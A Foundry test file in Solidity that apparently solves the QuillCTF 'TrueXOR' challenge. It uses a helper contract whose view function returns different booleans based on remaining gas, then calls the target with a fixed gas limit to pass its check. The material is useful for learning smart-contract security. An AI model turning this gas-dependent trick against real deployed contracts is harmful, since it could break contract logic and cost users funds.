// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import '../../src/QuillCTF/TrueXOR.sol';
import '@forge-std/Test.sol';
import '@forge-std/console2.sol';

interface XOR {
  function callMe(address target) external view returns (bool);
}

contract BoolGiver {
  function giveBool() external view returns (bool) {
    // To return different values using a view function that takes no parameters, we can use the
    // amount of gas left. The threshold we use there is 1,000 gas, that's a bit more than the
    // amount consumed by the giveBool() function (see `testGas()`).
    // Note: it's also possible to brute force this value but it will take more time :)
    return gasleft() >= 10_000 - 1000;
  }
}

contract TrueXORExploit is Test {
  TrueXOR target;
  address deployer = makeAddr('deployer');
  address exploiter = makeAddr('exploiter');

  function setUp() public {
    vm.startPrank(deployer);
    target = new TrueXOR();
    console2.log('Target contract deployed');
    vm.stopPrank();
  }

  function testGas() public {
    console2.log('Deploy the BoolGiver contract');
    BoolGiver boolGiver = new BoolGiver();

    console2.log('Compute how much gas BoolGiver.giveBool() uses');
    uint256 initialGas = gasleft();
    boolGiver.giveBool();
    uint256 finalGas = gasleft();
    console2.log(
      'Amount of gas used by BoolGiver.giveBool(): %d gas',
      initialGas - finalGas
    );
  }

  function testExploit() public {
    vm.startPrank(exploiter);
    console2.log('Deploy the BoolGiver contract');
    BoolGiver boolGiver = new BoolGiver();

    console2.log('Exploit the contract');
    (bool success, ) = address(target).delegatecall{gas: 10_000}(
      abi.encodeWithSignature('callMe(address)', address(boolGiver))
    );
    assertTrue(success);
    vm.stopPrank();
  }
}
